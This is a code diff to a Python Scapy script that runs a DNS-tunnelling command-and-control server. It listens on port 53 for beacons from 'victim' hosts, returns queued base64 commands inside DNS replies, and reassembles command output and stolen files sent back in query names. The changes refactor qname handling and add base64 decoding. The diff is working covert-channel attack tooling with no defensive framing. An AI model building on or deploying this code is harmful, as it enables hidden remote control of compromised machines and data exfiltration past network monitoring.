@@ -19,7 +19,7 @@ def commands_input():
             commands_que = {key: value}   
             print(commands_que)
 
-def send_command(ip_adr,vic_sport,data_recieved):
+def send_command(ip_adr,vic_sport,get_qname):
     global commands_que
     if not commands_que:
         return
@@ -36,8 +36,9 @@ def send_command(ip_adr,vic_sport,data_recieved):
     print(bin_command)
 
     combined = base64.b64encode(prefix) + base64.b64encode(bin_command)
-    pkt_no_data = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
-    send(pkt_no_data)
+    #pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
+    pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
+    send_response(pkt_no_dns,get_qname=get_qname,data=combined)
     #pkt_send(pkt_no_data,combined,0)
 
     commands_que = ""
@@ -49,23 +50,24 @@ def parse_packet(packet):
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: 
         victim_ip = packet[IP].src
         vic_sport = packet[UDP].sport
-        prefix_packet = check_prefix(packet,module="qname")     
-        data_recieved = extract_data(packet,module="qname",prefix_packet=prefix_packet)                                # only the data(without prefix)
+        get_qname = packet[DNS].qd.qname
+        prefix_packet = check_prefix(get_qname)     
+        data_recieved = extract_data(get_qname,prefix_packet)                                # only the data(without prefix)
         print(prefix_packet)
         if prefix_packet == BEACON:
             
-            send_command(victim_ip,vic_sport,data_recieved)                 # check if there is a command in the queue and send if there is
+            send_command(victim_ip,vic_sport,get_qname)                 # check if there is a command in the queue and send if there is
       
         elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
             opened_fd = open_file(LOG_OUTPUT)
-            write_to_file(opened_fd,data_recieved)  # write only the name of the command the the output commands log
+            write_to_file(opened_fd,base64.b64decode(data_recieved))  # write only the name of the command the the output commands log
         
         elif prefix_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
-            file_name = os.path.basename(data_recieved)
+            file_name = os.path.basename(base64.b64decode(data_recieved))
             opened_fd = open_file(file_name)
             
         elif prefix_packet == IN_TRANSFER:
-            write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
+            write_to_file(opened_fd,base64.b64decode(data_recieved))  # write the content to the opened fd
             
         elif prefix_packet == EF:                     # a packet that tells the server that client has finished transferring
             close_file(opened_fd)
@@ -74,7 +76,7 @@ def parse_packet(packet):
             
                         
 def server_listen():
-    sniff_pkt("UDP and port 53",parse_packet)
+    sniff_pkt("port 53",parse_packet)
     
 if __name__=="__main__":
     signal.signal(signal.SIGINT, signal_handler)
